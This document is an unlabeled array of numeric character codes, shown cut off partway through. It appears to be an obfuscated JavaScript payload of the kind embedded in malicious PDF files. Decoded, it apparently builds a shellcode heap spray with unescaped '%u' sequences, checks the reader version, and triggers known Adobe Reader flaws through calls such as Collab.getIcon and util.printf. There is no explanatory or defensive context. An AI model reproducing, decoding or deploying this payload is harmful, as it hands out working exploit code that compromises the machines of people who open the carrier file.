99, 87, 168, 105, 102, 119, 107, 87, 168, 120, 121, 120, 121, 87, 168, 106, 102, 120, 121, 87, 168, 99, 118, 117, 103, 87, 168, 102, 104, 106, 119, 87, 168, 103, 99, 119, 99, 87, 168, 102, 104, 106, 119, 87, 168, 103, 99, 107, 118, 87, 168, 103, 102, 103, 102, 87, 168, 103, 102, 103, 102, 87, 168, 103, 102, 103, 102, 87, 168, 105, 104, 120, 121, 87, 168, 117, 106, 98, 107, 87, 168, 107, 118, 102, 104, 87, 168, 98, 99, 102, 103, 87, 168, 98, 99, 98, 99, 87, 168, 120, 121, 103, 102, 87, 168, 103, 121, 118, 106, 87, 168, 116, 105, 98, 121, 87, 168, 103, 117, 117, 99, 87, 168, 117, 102, 117, 108, 87, 168, 106, 117, 103, 104, 87, 168, 103, 100, 119, 118, 87, 168, 103, 102, 103, 100, 87, 168, 103, 106, 103, 105, 87, 168, 102, 101, 104, 116, 87, 168, 105, 101, 119, 107, 87, 168, 98, 99, 98, 99, 87, 168, 106, 117, 98, 99, 87, 168, 101, 102, 118, 107, 87, 168, 106, 104, 120, 105, 87, 168, 103, 108, 118, 117, 87, 168, 102, 104, 117, 106, 87, 168, 104, 100, 120, 107, 87, 168, 104, 104, 100, 120, 87, 168, 117, 106, 105, 107, 87, 168, 120, 118, 102, 104, 87, 168, 98, 99, 104, 104, 87, 168, 98, 99, 98, 99, 87, 168, 103, 105, 105, 120, 87, 168, 102, 104, 106, 119, 87, 168, 103, 99, 120, 107, 87, 168, 119, 107, 103, 105, 87, 168, 98, 99, 103, 100, 87, 168, 98, 99, 98, 99, 87, 168, 103, 99, 103, 108, 87, 168, 116, 100, 119, 107, 87, 168, 120, 121, 120, 120, 87, 168, 106, 104, 120, 121, 87, 168, 103, 108, 117, 99, 87, 168, 105, 103, 103, 108, 87, 168, 106, 119, 101, 108, 87, 168, 98, 100, 102, 105, 87, 168, 119, 107, 103, 99, 87, 168, 98, 99, 101, 117, 87, 168, 98, 99, 98, 99, 87, 168, 120, 107, 106, 117, 87, 168, 102, 104, 106, 119, 87, 168, 103, 99, 120, 107, 87, 168, 100, 100, 119, 107, 87, 168, 120, 121, 120, 121, 87, 168, 106, 104, 120, 121, 87, 168, 103, 108, 117, 99, 87, 168, 105, 103, 103, 108, 87, 168, 103, 106, 98, 118, 87, 168, 98, 100, 119, 107, 87, 168, 120, 121, 120, 121, 87, 168, 103, 108, 120, 121, 87, 168, 102, 103, 117, 105, 87, 168, 120, 121, 101, 107, 87, 168, 103, 99, 105, 102, 87, 168, 102, 104, 106, 119, 87, 168, 120, 120, 120, 107, 87, 168, 103, 107, 98, 99, 87, 168, 102, 104, 106, 119, 87, 168, 103, 99, 120, 107, 87, 168, 119, 107, 103, 106, 87, 168, 120, 120, 105, 103, 87, 168, 120, 121, 120, 121, 87, 168, 103, 108, 103, 108, 87, 168, 102, 105, 102, 105, 87, 168, 120, 102, 101, 117, 87, 168, 115, 116, 105, 118, 87, 168, 103, 120, 103, 121, 87, 168, 117, 108, 103, 117, 87, 168, 103, 104, 117, 102, 87, 168, 119, 118, 106, 117, 87, 168, 103, 102, 103, 100, 87, 168, 104, 99, 104, 105, 87, 168, 101, 101, 116, 100, 87, 168, 98, 99, 119, 107, 87, 168, 98, 99, 98, 99, 87, 168, 103, 107, 98, 99, 87, 168, 98, 107, 101, 107, 87, 168, 98, 102, 105, 103, 87, 168, 119, 117, 102, 99, 87, 168, 102, 99, 120, 108, 87, 168, 103, 119, 106, 117, 87, 168, 106, 99, 98, 107, 87, 168, 102, 101, 120, 117, 87, 168, 98, 107, 105, 104, 87, 168, 118, 117, 101, 102, 87, 168, 99, 107, 106, 116, 87, 168, 117, 102, 106, 117, 87, 168, 99, 106, 119, 117, 87, 168, 99, 107, 101, 107, 87, 168, 99, 100, 105, 105, 87, 168, 101, 102, 102, 99, 87, 168, 106, 103, 117, 108, 87, 168, 105, 103, 118, 117, 87, 168, 102, 99, 98, 118, 87, 168, 98, 107, 101, 107, 87, 168, 120, 117, 105, 104, 87, 168, 120, 120, 102, 99, 87, 168, 119, 117, 117, 117, 87, 168, 101, 102, 120, 101, 87, 168, 106, 108, 117, 99, 87, 168, 120, 118, 102, 104, 87, 168, 102, 104, 106, 117, 87, 168, 103, 117, 120, 118, 87, 168, 117, 102, 117, 108, 87, 168, 98, 101, 101, 101, 87, 168, 105, 103, 104, 107, 87, 168, 105, 99, 105, 103, 87, 168, 100, 121, 101, 116, 87, 168, 104, 121, 100, 121, 87, 168, 105, 104, 105, 108, 87, 168, 104, 118, 104, 120, 87, 168, 104, 120, 104, 100, 87, 168, 100, 120, 104, 103, 87, 168, 105, 101, 104, 121, 87, 168, 100, 121, 104, 106, 87, 168, 105, 101, 104, 105, 87, 168, 104, 106, 104, 100, 87, 168, 105, 102, 105, 104, 87, 168, 104, 117, 100, 121, 87, 168, 104, 118, 104, 101, 87, 168, 101, 101, 105, 116, 87, 168, 104, 104, 100, 120, 87, 168, 104, 104, 105, 107, 87, 168, 104, 107, 98, 99, 87, 168, 105, 103, 105, 103, 87, 168, 101, 116, 105, 99, 87, 168, 100, 121, 100, 121, 87, 168, 105, 108, 104, 121, 87, 168, 104, 120, 105, 104, 87, 168, 104, 100, 104, 118, 87, 168, 104, 103, 104, 120, 87, 168, 104, 121, 100, 120, 87, 168, 104, 106, 105, 101, 87, 168, 104, 105, 100, 121, 87, 168, 104, 100, 105, 101, 87, 168, 105, 104, 104, 106, 87, 168, 100, 121, 105, 102, 87, 168, 104, 118, 104, 102, 87, 168, 104, 102, 104, 108, 87, 168, 100, 120, 104, 117, 87, 168, 104, 107, 105, 99, 87, 168, 101, 121, 105, 99, 87, 168, 101, 119, 105, 101, 87, 168, 98, 99, 98, 99, 84, 92, 109, 64, 60, 60, 59, 169, 147, 165, 82, 160, 151, 160, 145, 148, 164, 165, 147, 172, 82, 112, 82, 161, 151, 170, 82, 116, 164, 165, 147, 172, 90, 92, 109, 64, 60, 60, 59, 169, 147, 165, 82, 150, 149, 83, 111, 83, 98, 171, 98, 150, 98, 150, 98, 150, 98, 150, 109, 64, 60, 60, 59, 169, 147, 165, 82, 148, 150, 151, 164, 83, 111, 83, 98, 171, 102, 99, 98, 99, 98, 99, 109, 64, 60, 60, 59, 169, 147, 165, 82, 166, 149, 146, 158, 152, 160, 83, 111, 83, 165, 155, 151, 159, 158, 150, 161, 151, 151, 97, 158, 152, 160, 154, 166, 155, 82, 93, 82, 101, 109, 64, 60, 60, 59, 169, 147, 165, 82, 159, 151, 161, 82, 112, 82, 148, 150, 151, 164, 83, 95, 83, 90, 166, 149, 146, 158, 152, 160, 94, 98, 171, 101, 107, 91, 110, 63, 61, 59, 60, 168, 148, 164, 83, 171, 148, 164, 166, 162, 83, 111, 83, 167, 161, 151, 166, 149, 148, 162, 152, 90, 85, 87, 168, 107, 99, 107, 99, 87, 168, 107, 99, 107, 99, 84, 92, 109, 64, 60, 60, 59, 172, 147, 165, 165, 163, 82, 112, 82, 153, 155, 171, 145, 156, 166, 91, 171, 148, 164, 166, 162, 95, 82, 159, 151, 161, 91, 110, 63, 61, 59, 60, 168, 148, 164, 83, 149, 162, 167, 161, 166, 101, 82, 112, 82, 91, 149, 150, 82, 96, 82, 99, 170, 103, 98, 99, 98, 99, 98, 92, 97, 148, 150, 151, 164, 110, 63, 61, 59, 60, 152, 162, 164, 83, 90, 169, 147, 165, 82, 150, 161, 168, 160, 167, 82, 112, 82, 99, 109, 83, 149, 162, 167, 161, 166, 83, 110, 83, 149, 162, 167, 161, 166, 101, 109, 83, 149, 162, 167, 161, 166, 94, 93, 92, 173, 64, 60, 60, 59, 60, 159, 152, 159, 146, 147, 165, 164, 148, 171, 142, 149, 162, 167, 161, 166, 144, 82, 112, 82, 172, 147, 165, 165, 163, 82, 94, 82, 166, 154, 152, 158, 159, 149, 162, 150, 152, 109, 64, 60, 60, 59, 176, 63, 61, 59, 60, 168, 148, 164, 83, 161, 169, 151, 165, 152, 159, 161, 170, 82, 112, 82, 168, 160, 152, 165, 150, 147, 163, 151, 91, 84, 88, 167, 99, 149, 99, 149, 88, 167, 99, 149, 99, 149, 85, 91, 110, 63, 61, 59, 60, 169, 155, 155, 159, 151, 83, 90, 162, 168, 152, 164, 153, 158, 162, 169, 97, 158, 152, 160, 154, 166, 155, 82, 111, 82, 103, 102, 108, 103, 101, 91, 174, 63, 61, 59, 60, 59, 162, 168, 152, 164, 153, 158, 162, 169, 83, 93, 112, 82, 162, 168, 152, 164, 153, 158, 162, 169, 110, 63, 61, 59, 60, 175, 64, 60, 60, 59, 167, 154, 156, 165, 97, 149, 162, 158, 159, 147, 149, 133, 167, 161, 165, 151, 83, 111, 83, 117, 162, 158, 159, 147, 149, 96, 150, 161, 159, 158, 152, 149, 167, 119, 160, 147, 156, 158, 124, 160, 153, 161, 91, 173, 166, 167, 149, 156, 109, 82, 85, 84, 95, 159, 166, 153, 109, 82, 162, 168, 152, 164, 153, 158, 162, 169, 176, 91, 110, 63, 61, 59, 176, 63, 61, 63, 61, 59, 153, 167, 161, 149, 167, 155, 162, 160, 83, 149, 162, 158, 159, 147, 149, 145, 154, 151, 167, 155, 150, 161, 161, 90, 92, 173, 64, 60, 60, 59, 156, 152, 83, 90, 148, 162, 163, 96, 151, 161, 150, 96, 118, 161, 159, 158, 148, 148, 97, 153, 152, 166, 124, 149, 162, 160, 92, 173, 64, 60, 60, 59, 60, 168, 148, 164, 83, 147, 165, 164, 172, 82, 112, 82, 161, 151, 170, 82, 116, 164, 165, 147, 172, 90, 92, 109, 64, 60, 60, 59, 60, 168, 148, 164, 83, 168, 169, 162, 152, 166, 155, 171, 148, 82, 112, 82, 168, 160, 152, 165, 150, 147, 163, 151, 91, 84, 88, 167, 120, 116, 120, 107, 88, 167, 99, 98, 99, 99, 88, 167, 104, 104, 99, 98, 88, 167, 116, 99, 105, 102, 88, 167, 99, 98, 102, 98, 88, 167, 99, 98, 99, 98, 88, 167, 103, 98, 107, 116, 88, 167, 107, 116, 99, 117, 88, 167, 100, 117, 106, 98, 88, 167, 107, 116, 116, 118, 88, 167, 99, 106, 103, 98, 88, 167, 118, 101, 104, 119, 88, 167, 107, 116, 104, 103, 88, 167, 107, 116, 120, 117, 88, 167, 99, 106, 103, 103, 88, 167, 102, 101, 104, 100, 88, 167, 118, 99, 119, 100, 88, 167, 99, 101, 118, 100, 88, 167, 100, 98, 102, 100, 88, 167, 107, 98, 103, 98, 88, 167, 99, 98, 102, 106, 88, 167, 121, 103, 106, 103, 88, 167, 118, 100, 107, 116, 88, 167, 104, 118, 104, 115, 88, 167, 99, 102, 118, 100, 88, 167, 104, 103, 99, 98, 88, 167, 120, 117, 107, 116, 88, 167, 104, 99, 104, 99, 88, 167, 104, 104, 104, 101, 88, 167, 105, 98, 104, 105, 88, 167, 104, 118, 107, 116, 88, 167, 102, 101, 99, 106, 88, 167, 107, 116, 118, 98, 88, 167, 99, 117, 106, 103, 88, 167, 121, 119, 107, 116, 88, 167, 106, 104, 99, 101, 88, 167, 107, 116, 102, 117, 88, 167, 106, 106, 103, 119, 88, 167, 118, 120, 99, 101, 88, 167, 104, 99, 107, 116, 88, 167, 104, 100, 100, 117, 88, 167, 104, 99, 107, 116, 88, 167, 104, 100, 101, 102, 88, 167, 106, 99, 107, 116, 88, 167, 103, 119, 100, 102, 88, 167, 106, 103, 107, 107, 88, 167, 107, 116, 121, 117, 88, 167, 101, 98, 106, 99, 88, 167, 121, 105, 99, 101, 88, 167, 103, 115, 108, 107, 88, 167, 103, 100, 116, 118, 88, 167, 102, 116, 105, 98, 88, 167, 121, 117, 104, 103, 88, 167, 99, 102, 106, 103, 88, 167, 118, 98, 102, 101, 88, 167, 102, 105, 120, 116, 88, 167, 121, 120, 102, 101, 88, 167, 103, 103, 99, 101, 88, 167, 108, 105, 99, 117, 88, 167, 118, 120, 107, 116, 88, 167, 106, 103, 116, 119, 88, 167, 101, 116, 121, 118, 88, 167, 103, 120, 121, 107, 88, 167, 120, 106, 104, 99, 88, 167, 121, 120, 108, 102, 88, 167, 121, 120, 121, 120, 88, 167, 118, 101, 102, 116, 88, 167, 106, 102, 105, 99, 88, 167, 120, 116, 99, 100, 88, 167, 107, 116, 119, 107, 88, 167, 99, 117, 103, 103, 88, 167, 104, 119, 108, 100, 88, 167, 121, 100, 99, 101, 88, 167, 120, 98, 119, 99, 88, 167, 118, 104, 99, 101, 88, 167, 118, 107, 102, 101, 88, 167, 117, 105, 99, 120, 88, 167, 104, 120, 99, 106, 88, 167, 120, 99, 118, 99, 88, 167, 99, 101, 99, 100, 88, 167, 99, 101, 118, 115, 88, 167, 107, 116, 118, 120, 88, 167, 99, 101, 99, 99, 88, 167, 107, 107, 118, 100, 88, 167, 121, 106, 103, 103, 88, 167, 107, 116, 105, 99, 88, 167, 121, 106, 103, 103, 88, 167, 104, 119, 104, 120, 88, 167, 118, 107, 104, 116, 88, 167, 104, 103, 118, 101, 88, 167, 120, 117, 107, 116, 88, 167, 120, 106, 104, 99, 88, 167, 121, 120, 103, 107, 88, 167, 121, 120, 121, 120, 88, 167, 105, 106, 104, 98, 88, 167, 105, 98, 120, 106, 88, 167, 99, 102, 117, 120, 88, 167, 105, 117, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 102, 101, 121, 120, 88, 167, 104, 100, 119, 100, 88, 167, 121, 120, 104, 100, 88, 167, 99, 106, 106, 103, 88, 167, 119, 98, 121, 120, 88, 167, 103, 103, 107, 107, 88, 167, 107, 116, 121, 117, 88, 167, 121, 117, 103, 103, 88, 167, 118, 101, 118, 107, 88, 167, 107, 116, 104, 103, 88, 167, 107, 101, 120, 117, 88, 167, 99, 117, 120, 117, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 102, 88, 167, 103, 103, 118, 104, 88, 167, 106, 103, 121, 102, 88, 167, 103, 103, 118, 104, 88, 167, 106, 100, 121, 103, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 104, 88, 167, 103, 103, 118, 104, 88, 167, 105, 118, 121, 105, 88, 167, 103, 103, 118, 104, 88, 167, 105, 120, 121, 106, 88, 167, 103, 103, 118, 104, 88, 167, 105, 119, 121, 107, 88, 167, 103, 103, 118, 104, 88, 167, 101, 119, 121, 115, 88, 167, 103, 103, 118, 104, 88, 167, 105, 102, 121, 116, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 117, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 118, 88, 167, 103, 103, 118, 104, 88, 167, 99, 98, 121, 119, 88, 167, 116, 98, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 104, 98, 121, 120, 88, 167, 104, 118, 105, 106, 88, 167, 100, 99, 107, 115, 88, 167, 120, 106, 100, 104, 88, 167, 121, 120, 100, 103, 88, 167, 121, 120, 121, 120, 88, 167, 118, 102, 107, 101, 88, 167, 107, 103, 99, 117, 88, 167, 106, 102, 118, 98, 88, 167, 105, 115, 100, 103, 88, 167, 105, 115, 99, 98, 88, 167, 121, 120, 99, 98, 88, 167, 99, 117, 106, 103, 88, 167, 106, 103, 121, 120, 88, 167, 105, 115, 99, 106, 88, 167, 121, 120, 99, 98, 88, 167, 107, 103, 119, 98, 88, 167, 106, 103, 118, 98, 88, 167, 103, 98, 99, 101, 88, 167, 118, 101, 118, 107, 88, 167, 118, 98, 102, 101, 88, 167, 118, 101, 118, 107, 88, 167, 102, 101, 104, 105, 88, 167, 107, 116, 118, 98, 88, 167, 101, 102, 103, 117, 88, 167, 107, 116, 99, 117, 88, 167, 101, 102, 106, 117, 88, 167, 121, 117, 99, 106, 88, 167, 116, 115, 121, 101, 88, 167, 118, 101, 104, 120, 88, 167, 103, 117, 107, 116, 88, 167, 99, 102, 101, 102, 88, 167, 102, 107, 107, 98, 88, 167, 107, 116, 99, 98, 88, 167, 106, 102, 118, 99, 88, 167, 103, 98, 99, 104, 88, 167, 102, 106, 107, 98, 88, 167, 106, 103, 99, 98, 88, 167, 101, 116, 121, 115, 88, 167, 118, 101, 118, 99, 88, 167, 107, 116, 104, 103, 88, 167, 107, 101, 120, 117, 88, 167, 105, 102, 120, 117, 88, 167, 107, 118, 104, 101, 88, 167, 121, 98, 103, 103, 88, 167, 102, 101, 104, 105, 88, 167, 104, 98, 119, 116, 88, 167, 103, 103, 118, 104, 88, 167, 105, 116, 121, 98, 88, 167, 103, 103, 118, 104, 88, 167, 105, 103, 121, 99, 88, 167, 103, 103, 118, 104, 88, 167, 106, 100, 121, 100, 88, 167, 103, 103, 118, 104, 88, 167, 105, 119, 121, 101, 88, 167, 103, 103, 118, 104, 88, 167, 105, 103, 121, 102, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 103, 88, 167, 103, 103, 118, 104, 88, 167, 102, 101, 121, 104, 88, 167, 103, 103, 118, 104, 88, 167, 102, 100, 121, 105, 88, 167, 103, 103, 118, 104, 88, 167, 101, 119, 121, 106, 88, 167, 103, 103, 118, 104, 88, 167, 105, 102, 121, 107, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 115, 88, 167, 103, 103, 118, 104, 88, 167, 105, 117, 121, 116, 88, 167, 104, 118, 107, 106, 88, 167, 120, 106, 121, 117, 88, 167, 121, 120, 99, 116, 88, 167, 121, 120, 121, 120, 88, 167, 105, 106, 104, 98, 88, 167, 103, 101, 105, 106, 88, 167, 107, 119, 121, 107, 88, 167, 107, 98, 120, 106, 88, 167, 121, 120, 121, 119, 88, 167, 107, 116, 121, 120, 88, 167, 107, 118, 121, 106, 88, 167, 108, 117, 103, 103, 88, 167, 103, 102, 105, 115, 88, 167, 120, 106, 104, 98, 88, 167, 121, 120, 106, 119, 88, 167, 121, 120, 121, 120, 88, 167, 103, 103, 107, 118, 88, 167, 105, 115, 120, 98, 88, 167, 104, 98, 100, 98, 88, 167, 106, 101, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 107, 101, 121, 120, 88, 167, 100, 117, 118, 102, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 120, 98, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 108, 117, 88, 167, 104, 101, 104, 101, 88, 167, 104, 101, 104, 101, 88, 167, 104, 101, 104, 101, 88, 167, 106, 103, 121, 120, 88, 167, 118, 105, 99, 106, 88, 167, 108, 117, 103, 103, 88, 167, 99, 98, 103, 102, 88, 167, 99, 98, 99, 98, 88, 167, 121, 120, 104, 101, 88, 167, 104, 120, 119, 105, 88, 167, 117, 104, 99, 120, 88, 167, 104, 116, 118, 98, 88, 167, 118, 101, 118, 107, 88, 167, 107, 116, 104, 103, 88, 167, 104, 99, 120, 117, 88, 167, 104, 101, 104, 99, 88, 167, 104, 105, 104, 104, 88, 167, 103, 100, 105, 115, 88, 167, 106, 100, 120, 106, 88, 167, 99, 98, 99, 98, 88, 167, 107, 116, 99, 98, 88, 167, 102, 101, 119, 106, 88, 167, 107, 103, 121, 104, 88, 167, 104, 107, 119, 116, 88, 167, 103, 103, 118, 105, 88, 167, 105, 99, 121, 106, 88, 167, 105, 103, 101, 119, 88, 167, 118, 105, 106, 106, 88, 167, 121, 117, 103, 103, 88, 167, 99, 98, 105, 103, 88, 167, 99, 98, 99, 98, 88, 167, 104, 104, 106, 119, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 106, 88, 167, 120, 106, 104, 104, 88, 167, 99, 98, 104, 99, 88, 167, 99, 98, 99, 98, 88, 167, 104, 98, 104, 107, 88, 167, 117, 99, 120, 106, 88, 167, 121, 120, 121, 119, 88, 167, 107, 103, 121, 120, 88, 167, 104, 107, 118, 98, 88, 167, 106, 102, 104, 107, 88, 167, 107, 118, 102, 107, 88, 167, 99, 99, 103, 104, 88, 167, 120, 106, 104, 98, 88, 167, 99, 98, 102, 116, 88, 167, 99, 98, 99, 98, 88, 167, 121, 106, 107, 116, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 106, 88, 167, 101, 99, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 107, 103, 121, 120, 88, 167, 104, 107, 118, 98, 88, 167, 106, 102, 104, 107, 88, 167, 104, 105, 99, 117, 88, 167, 99, 99, 120, 106, 88, 167, 121, 120, 121, 120, 88, 167, 104, 107, 121, 120, 88, 167, 103, 102, 118, 104, 88, 167, 121, 120, 102, 106, 88, 167, 104, 98, 106, 101, 88, 167, 103, 103, 107, 118, 88, 167, 121, 119, 121, 106, 88, 167, 104, 106, 99, 98, 88, 167, 103, 103, 107, 118, 88, 167, 104, 98, 121, 106, 88, 167, 120, 106, 104, 105, 88, 167, 121, 119, 106, 102, 88, 167, 121, 120, 121, 120, 88, 167, 104, 107, 104, 107, 88, 167, 103, 104, 103, 104, 88, 167, 121, 101, 102, 116, 88, 167, 116, 115, 106, 117, 88, 167, 104, 119, 104, 120, 88, 167, 118, 107, 104, 116, 88, 167, 104, 103, 118, 101, 88, 167, 120, 117, 107, 116, 88, 167, 104, 101, 104, 99, 88, 167, 105, 98, 105, 104, 88, 167, 102, 100, 117, 99, 88, 167, 99, 98, 120, 106, 88, 167, 99, 98, 99, 98, 88, 167, 104, 106, 99, 98, 88, 167, 99, 106, 102, 106, 88, 167, 99, 101, 106, 102, 88, 167, 120, 116, 103, 98, 88, 167, 103, 98, 121, 107, 88, 167, 104, 118, 107, 116, 88, 167, 107, 98, 99, 106, 88, 167, 103, 100, 121, 116, 88, 167, 99, 106, 106, 103, 88, 167, 119, 116, 102, 101, 88, 167, 100, 106, 107, 115, 88, 167, 118, 101, 107, 116, 88, 167, 100, 105, 120, 116, 88, 167, 100, 106, 102, 106, 88, 167, 100, 99, 106, 104, 88, 167, 102, 101, 103, 98, 88, 167, 107, 102, 118, 107, 88, 167, 106, 102, 119, 116, 88, 167, 103, 98, 99, 117, 88, 167, 99, 106, 102, 106, 88, 167, 121, 116, 106, 103, 88, 167, 121, 119, 103, 98, 88, 167, 120, 116, 118, 116, 88, 167, 102, 101, 121, 100, 88, 167, 107, 107, 118, 98, 88, 167, 121, 117, 103, 103, 88, 167, 103, 103, 107, 116, 88, 167, 104, 116, 121, 117, 88, 167, 118, 101, 118, 107, 88, 167, 99, 100, 102, 100, 88, 167, 106, 102, 105, 106, 88, 167, 106, 98, 106, 102, 88, 167, 101, 120, 102, 115, 88, 167, 105, 120, 101, 120, 88, 167, 106, 103, 106, 107, 88, 167, 105, 117, 105, 119, 88, 167, 105, 119, 105, 99, 88, 167, 101, 119, 105, 102, 88, 167, 106, 100, 105, 120, 88, 167, 101, 120, 105, 105, 88, 167, 106, 100, 105, 104, 88, 167, 105, 105, 105, 99, 88, 167, 106, 101, 106, 103, 88, 167, 105, 102, 101, 120, 88, 167, 105, 117, 105, 105, 88, 167, 106, 100, 106, 99, 88, 167, 102, 100, 106, 106, 88, 167, 105, 103, 101, 119, 88, 167, 105, 103, 106, 106, 88, 167, 105, 106, 99, 98, 88, 167, 106, 102, 106, 102, 88, 167, 102, 115, 106, 98, 88, 167, 101, 120, 101, 120, 88, 167, 106, 107, 105, 120, 88, 167, 105, 119, 106, 103, 88, 167, 105, 99, 105, 117, 88, 167, 105, 102, 105, 119, 88, 167, 105, 120, 101, 119, 88, 167, 105, 105, 106, 100, 88, 167, 105, 104, 101, 120, 88, 167, 105, 99, 106, 100, 88, 167, 106, 103, 105, 105, 88, 167, 101, 120, 106, 101, 88, 167, 105, 117, 105, 101, 88, 167, 105, 101, 105, 107, 88, 167, 101, 119, 105, 116, 88, 167, 105, 106, 106, 98, 88, 167, 102, 120, 106, 98, 88, 167, 102, 118, 106, 100, 88, 167, 99, 98, 99, 98, 85, 91, 110, 63, 61, 59, 60, 59, 169, 147, 165, 82, 155, 137, 164, 103, 99, 98, 118, 128, 83, 111, 83, 168, 169, 162, 152, 166, 155, 171, 148, 96, 159, 151, 161, 153, 167, 154, 83, 92, 83, 100, 110, 63, 61, 59, 60, 59, 169, 147, 165, 82, 159, 151, 161, 82, 112, 82, 99, 170, 103, 98, 99, 98, 99, 98, 83, 95, 83, 90, 155, 137, 164, 103, 99, 98, 118, 128, 83, 93, 83, 98, 171, 101, 107, 91, 110, 63, 61, 59, 60, 59, 169, 147, 165, 82, 172, 147, 165, 165, 163, 82, 112, 82, 168, 160, 152, 165, 150, 147, 163, 151, 91, 84, 88, 167, 108, 98, 108, 98, 88, 167, 108, 98, 108, 98, 85, 91, 110, 63, 61, 59, 60, 59, 172, 147, 165, 165, 163, 82, 112, 82, 153, 155, 171, 145, 156, 166, 91, 171, 148, 164, 166, 162, 95, 82, 159, 151, 161, 91, 110, 63, 61, 59, 60, 59, 169, 147, 165, 82, 163, 103, 116, 156, 126, 104, 104, 152, 83, 111, 83, 90, 99, 170, 99, 149, 99, 149, 99, 149, 99, 149, 83, 95, 83, 98, 171, 102, 99, 98, 99, 98, 99, 91, 83, 97, 83, 98, 171, 102, 99, 98, 99, 98, 99, 109, 64, 60, 60, 59, 60, 152, 162, 164, 83, 90, 169, 147, 165, 82, 169, 163, 150, 131, 119, 107, 105, 171, 83, 111, 83, 98, 110, 82, 169, 163, 150, 131, 119, 107, 105, 171, 83, 110, 83, 162, 104, 115, 157, 125, 105, 103, 153, 109, 83, 168, 164, 149, 132, 118, 108, 104, 172, 82, 94, 93, 83, 91, 174, 63, 61, 59, 60, 59, 60, 147, 165, 164, 172, 141, 169, 163, 150, 131, 119, 107, 105, 171, 144, 82, 112, 82, 172, 147, 165, 165, 163, 82, 94, 82, 169, 168, 163, 151, 167, 154, 172, 147, 110, 63, 61, 59, 60, 59, 176, 63, 61, 59, 60, 59, 169, 147, 165, 82, 167, 135, 128, 154, 129, 148, 122, 169, 83, 111, 83, 167, 161, 151, 166, 149, 148, 162, 152, 90, 85, 87, 99, 107, 85, 91, 110, 63, 61, 59, 60, 59, 170, 154, 156, 158, 152, 82, 91, 166, 136, 127, 155, 128, 149, 121, 170, 96, 159, 151, 161, 153, 167, 154, 83, 110, 83, 98, 171, 102, 99, 98, 99, 91, 174, 63, 61, 59, 60, 59, 60, 166, 136, 127, 155, 128, 149, 121, 170, 82, 94, 111, 83, 166, 136, 127, 155, 128, 149, 121, 170, 109, 64, 60, 60, 59, 60, 175, 64, 60, 60, 59, 60, 166, 136, 127, 155, 128, 149, 121, 170, 82, 112, 82, 85, 128, 97, 84, 83, 93, 83, 166, 136, 127, 155, 128, 149, 121, 170, 109, 64, 60, 60, 59, 60, 147, 163, 162, 97, 150, 162, 149, 97, 117, 162, 158, 159, 147, 149, 96, 154, 151, 167, 123, 150, 161, 161, 90, 167, 135, 128, 154, 129, 148, 122, 169, 92, 109, 64, 60, 60, 59, 176, 63, 61, 59, 176, 63, 61, 63, 61, 59, 153, 167, 161, 149, 167, 155, 162, 160, 83, 162, 151, 152, 146, 165, 167, 147, 165, 166, 91, 91, 174, 63, 61, 63, 61, 59, 60, 168, 148, 164, 83, 168, 152, 164, 166, 155, 162, 160, 83, 111, 83, 147, 163, 162, 97, 168, 156, 151, 170, 151, 165, 136, 152, 164, 166, 155, 162, 160, 97, 166, 162, 133, 167, 164, 156, 160, 154, 90, 92, 109, 64, 60, 60, 59, 169, 151, 165, 165, 156, 161, 161, 82, 112, 82, 169, 151, 165, 165, 156, 161, 161, 96, 165, 151, 163, 158, 148, 149, 152, 90, 98, 142, 119, 97, 154, 94, 90, 89, 92, 109, 64, 60, 60, 59, 169, 147, 165, 82, 169, 147, 165, 165, 156, 161, 161, 145, 148, 164, 165, 147, 172, 82, 112, 82, 161, 151, 170, 82, 116, 164, 165, 147, 172, 90, 169, 151, 165, 165, 156, 161, 161, 96, 150, 154, 148, 164, 116, 166, 91, 98, 92, 94, 83, 168, 152, 164, 166, 155, 162, 160, 97, 149, 155, 147, 165, 115, 167, 90, 100, 91, 95, 82, 169, 151, 165, 165, 156, 161, 161, 96, 150, 154, 148, 164, 116, 166, 91, 100, 92, 91, 110, 63, 61, 59, 60, 155, 153, 82, 91, 90, 169, 147, 165, 165, 156, 161, 161, 145, 148, 164, 165, 147, 172, 141, 99, 143, 83, 111, 112, 82, 107, 91, 83, 88, 89, 82, 91, 168, 148, 164, 166, 155, 162, 160, 146, 147, 165, 164, 148, 171, 142, 99, 144, 82, 112, 111, 83, 98, 92, 82, 175, 174, 83, 90, 169, 147, 165, 165, 156, 161, 161, 145, 148, 164, 165, 147, 172, 141, 100, 143, 83, 111, 112, 82, 100, 82, 89, 88, 83, 168, 148, 164, 166, 155, 162, 160, 146, 147, 165, 164, 148, 171, 142, 100, 144, 82, 111, 82, 102, 91, 92, 173, 64, 60, 60, 59, 60, 167, 167, 155, 159, 145, 163, 164, 156, 160, 167, 152, 91, 91, 110, 63, 61, 59, 60, 175, 64, 60, 60, 59, 156, 152, 83, 90, 91, 168, 148, 164, 166, 155, 162, 160, 146, 147, 165, 164, 148, 171, 142, 98, 144, 82, 111, 82, 107, 91, 83, 174, 175, 82, 91, 168, 148, 164, 166, 155, 162, 160, 146, 147, 165, 164, 148, 171, 142, 98, 144, 82, 112, 111, 83, 106, 83, 88, 89, 82, 169, 147, 165, 165, 156, 161, 161, 145, 148, 164, 165, 147, 172, 141, 100, 143, 83, 110, 83, 100, 83, 88, 89, 82, 169, 147, 165, 165, 156, 161, 161, 145, 148, 164, 165, 147, 172, 141, 101, 143, 83, 110, 83, 100, 92, 91, 174, 63, 61, 59, 60, 59, 150, 161, 159, 158, 148, 148, 146, 151, 160, 147, 156, 158, 91, 91, 110, 63, 61, 59, 60, 175, 64, 60, 60, 59, 156, 152, 83, 90, 91, 168, 148, 164, 166, 155, 162, 160, 146, 147, 165, 164, 148, 171, 142, 98, 144, 82, 111, 82, 108, 91, 83, 174, 175, 82, 91, 168, 148, 164, 166, 155, 162, 160, 146, 147, 